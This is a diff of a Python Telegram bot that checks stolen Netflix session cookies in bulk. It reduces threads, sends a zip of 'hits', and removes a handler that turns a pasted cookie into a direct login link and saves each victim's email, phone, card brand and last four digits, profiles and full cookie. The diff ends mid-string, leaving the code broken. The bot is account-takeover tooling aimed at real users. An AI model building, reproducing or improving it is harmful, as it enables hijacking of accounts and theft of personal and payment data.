@@ -20,10 +20,10 @@ if not BOT_TOKEN:
     print("❌ BOT_TOKEN not set!")
     exit(1)
 
-bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
+bot = telebot.TeleBot(BOT_TOKEN)
 
 class NetflixBulkChecker:
-    def __init__(self, threads=8):
+    def __init__(self, threads=5):
         self.threads = threads
         self.lock = threading.Lock()
         self.stats = {'total':0, 'checked':0, 'hits':0, 'bad':0, 'errors':0, 'start_time':time.time()}
@@ -195,10 +195,11 @@ def handle_file(message):
                 txt_path = os.path.join(tmp, file_name)
                 with open(txt_path, "wb") as f: f.write(downloaded)
 
-            checker = NetflixBulkChecker(threads=8)
+            checker = NetflixBulkChecker(threads=5)   # ← Lower threads for stability
             checker.chat_id = str(message.chat.id)
             checker.start(extract_dir)
 
+            # Always try to send hits.zip
             if os.path.exists("hits") and os.listdir("hits"):
                 hits_zip = os.path.join(tmp, "hits.zip")
                 with zipfile.ZipFile(hits_zip, 'w') as z:
@@ -206,51 +207,4 @@ def handle_file(message):
                         for file in fs:
                             z.write(os.path.join(root, file), file)
                 with open(hits_zip, "rb") as f:
-                    bot.send_document(message.chat.id, f, caption="🎉 All Hits Saved with Full Cookie!")
-                shutil.rmtree("hits", ignore_errors=True)
-            else:
-                bot.reply_to(message, "❌ No hits found.")
-
-    except Exception as e:
-        bot.reply_to(message, f"Error: {str(e)[:200]}")
-
-# ====================== DIRECT COOKIE TEXT ======================
-@bot.message_handler(func=lambda m: True)
-def handle_direct_cookie(message):
-    text = message.text.strip()
-    if not text or not ("NetflixId=" in text or "\t" in text):
-        return
-
-    bot.reply_to(message, "🔄 Processing cookie...")
-
-    try:
-        checker = NetflixBulkChecker()
-        checker.chat_id = str(message.chat.id)
-        result = checker.check_cookie(text, "direct_chat")
-
-        if result and result.get('login_url'):
-            bot.reply_to(message, f"✅ **Direct Login Link**\n\n{result['login_url']}")
-            
-            os.makedirs('hits', exist_ok=True)
-            fname = f"[{result['country_code']}] [{result['email']}] - {result['plan']}.txt"
-            with open(f"hits/{fname}", 'w', encoding='utf-8') as f:
-                f.write(f"Email: {result['email']}\n")
-                f.write(f"Plan: {result['plan']}\n")
-                f.write(f"Country: {result['country_code']}\n")
-                f.write(f"Next Billing: {result['next_billing']}\n")
-                f.write(f"Phone: {result['phone']}\n")
-                f.write(f"Card: {result['card_brand']} ••••{result['last4']}\n")
-                f.write(f"Profiles: {result['profiles']}\n")
-                f.write(f"Login URL: {result['login_url']}\n\n")
-                f.write("--- FULL COOKIE ---\n")
-                f.write(result['cookie'])
-        else:
-            bot.reply_to(message, "❌ Invalid or Dead Cookie")
-
-    except Exception as e:
-        bot.reply_to(message, f"Error: {str(e)}")
-
-if __name__ == "__main__":
-    print("🚀 Netflix Cookie Checker Bot Started")
-    bot.remove_webhook()
-    bot.infinity_polling(skip_pending=True)
+                    bot.send_document(message.chat.id, f, caption="🎉 All Hits Saved with
